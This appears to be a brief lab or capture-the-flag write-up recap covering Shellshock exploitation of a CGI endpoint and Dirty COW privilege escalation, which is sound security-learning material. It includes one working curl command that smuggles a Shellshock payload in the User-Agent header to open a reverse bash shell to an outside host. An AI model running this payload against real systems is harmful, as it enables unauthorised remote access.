#### Recap
The lab covered CGI handling, Linux kernel vulnerabilities, C compilation, and local password hash formats.
The initial scan identified SSH and HTTP. The HTTP landing page contained little useful information, so I enumerated its paths.
Directory discovery revealed a CGI endpoint missed by Nikto. Several checks confirmed that its Shellshock exposure could lead to initial execution as the web account.
```bash
curl -H "user-agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.45.208/443 0>&1" \http://192.168.119.87/cgi-bin/test
```

SUID and sudo checks did not provide a viable path. LinPEAS identified Dirty COW. Earlier test variants failed to compile or had no effect, but a compatible variant confirmed privileged account database modification.

If GCC reports that cc1 is missing, check whether the compiler component is installed and discoverable.
A failed proof of concept may reflect a build or environment mismatch. Compare the test assumptions with the target before ruling out the vulnerability.
Back up system files before making controlled changes in a lab.
